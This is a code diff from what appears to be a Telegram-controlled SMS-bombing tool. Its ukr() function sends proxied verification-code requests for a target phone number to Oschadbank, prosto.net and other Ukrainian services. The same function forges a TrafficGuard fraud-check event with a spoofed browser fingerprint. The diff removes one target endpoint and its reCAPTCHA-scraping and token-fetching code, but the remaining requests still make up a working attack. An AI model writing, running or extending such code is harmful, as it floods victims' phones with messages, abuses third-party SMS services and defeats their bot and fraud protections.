@@ -25,8 +25,7 @@ from headers_main import (
     cookies_elmir_call, headers_apteka24, headers_ta_da, headers_monto, cookies_monto,
     headers_smartmedical, cookies_smartmedical, headers_silpo, headers_goodwine,
     headers_finbert, cookies_finbert, headers_brabrabra, cookies_brabrabra,
-    headers_workua, cookies_workua, headers_binance, cookies_binance, headers_trafficguard,
-    headers_venus
+    headers_workua, cookies_workua, headers_binance, cookies_binance, headers_trafficguard
 )
 import asyncpg
 import config
@@ -1643,26 +1642,6 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None, proxy_entry=None
         # Використовуємо з cookies як fallback
         brabrabra_sessid = cookies_brabrabra.get("PHPSESSID", "")
 
-    # Отримуємо reCAPTCHA токен для venus (sushi-master)
-    venus_recaptcha_token = None
-    try:
-        # Спробуємо отримати site key з сайту
-        venus_url = "https://kyiv.sushi-master.ua/"
-        async with aiohttp.ClientSession() as session:
-            async with session.get(venus_url, headers=headers_venus, proxy=proxy_url, proxy_auth=proxy_auth) as response:
-                html = await response.text()
-                # Шукаємо site key в HTML (зазвичай в скриптах reCAPTCHA)
-                site_key_match = re.search(r'data-sitekey=["\']([^"\']+)["\']|render=["\']([^"\']+)["\']|recaptcha["\']?[^"\']*["\']?([A-Za-z0-9_-]{40})', html)
-                if site_key_match:
-                    site_key = site_key_match.group(1) or site_key_match.group(2) or site_key_match.group(3)
-                    logging.info(f"Знайдено reCAPTCHA site key для venus: {site_key[:20]}...")
-                    venus_recaptcha_token = await get_recaptcha_v3_token(site_key, action='submit', url=venus_url, proxy_url=proxy_url, proxy_auth=proxy_auth)
-                else:
-                    # Якщо не знайдено, спробуємо з загальним site key або без нього
-                    logging.warning("Не знайдено site key для venus, спробуємо без токену")
-    except Exception as e:
-        logging.warning(f"Не вдалося отримати reCAPTCHA токен для venus: {e}")
-
     # Генеруємо динамічні параметри для TrafficGuard
     trafficguard_sid = str(uuid.uuid4())
     trafficguard_psi = str(uuid.uuid4())
@@ -1908,7 +1887,6 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None, proxy_entry=None
             bounded_request("https://api.trafficguard.ai/tg-g-017014-001/api/v4/client-side/validate/event", **with_proxy({"data": {"pgid": "tg-g-017014-001", "sid": trafficguard_sid, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "hr": "https://duckduckgo.com/", "pd": "{'name':'javascript_tag','version':'2.10.10'}", "psi": trafficguard_psi, "fpj": "true", "pvc": "1", "e": "registration", "et": trafficguard_timestamp, "etu": trafficguard_timestamp_u, "ep": '{"tag":"tg_68e3b20662f40"}', "tag": "tg_68e3b20662f40", "bua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "buad": "{}", "bw": "false", "bl": "uk-UA", "bcd": "24", "bdm": "not available", "bpr": "2", "bhc": "4", "bsr": "900,1800", "bto": "0", "bt": "Atlantic/Reykjavik", "bss": "true", "bls": "true", "bid": "true", "bod": "false", "bcc": "not available", "bnp": "Win32", "bdnt": "unspecified", "babk": "false", "bts": "10, false, false", "bf": trafficguard_bf, "s": "duckduckgo.com", "c": "", "p": "", "crt": "", "c2": "", "k": "", "sei": "", "t": "", "ti": "", "usid": "", "s3": "", "a": "", "csid": "", "pidi": "", "s2": "", "a2": "", "a4": "", "a3": "", "g": "", "wh": "rozetka.com.ua", "wp": "/", "wt": "Інтернет-магазин ROZETKA™: офіційний сайт онлайн-гіпермаркету Розетка в Україні", "wu": "https://rozetka.com.ua/", "bipe": "false", "bih": "false", "sis": "", "pci": "", "event_revenue_usd": "", "isc": "", "gid": "", "csi": "javascript_tag", "gc": "", "msclkid": "", "tgclid": "", "tgsid": "", "fbclid": "", "irclid": "", "dcclid": "", "gclsrc": "", "gbraid": "", "wbraid": "", "gac": "", "sipa": "eyJpZCI6ImpzIiwic2MiOiJnZW5lcmF0ZWQifQ==", "sila": "r", "if": "false", "pc": trafficguard_pc, "lksd": trafficguard_lksd, "cd": trafficguard_cd, "cpr": "true", "ciid": trafficguard_ciid, "fuid": "", "fbpxid": "480863978968397", "tid": "", "lpd": trafficguard_lpd, "stpes": "false", "udo": "e30="}, "headers": headers_trafficguard})),
             bounded_request(f"https://c2c.oschadbank.ua/api/sms/{number}", **with_proxy({"method": 'GET', "headers": headers})),
             bounded_request(f"https://api.prosto.net/v2/verify?type=intl_phone&value={number}", **with_proxy({"method": 'GET', "headers": headers})),
-            bounded_request("https://venus-api-customers.x100-apps.com/v1/SendCode", **with_proxy({"json": {"recipient": "+" + number, "retailNetworkId": "4C25DB70-1DCE-11EB-A6EC-7B643829D650", "source": "WEB"}, "headers": {**headers_venus, "x-recaptcha-token": venus_recaptcha_token or ""}})),
         ]
 
     if not attack_flags.get(chat_id):
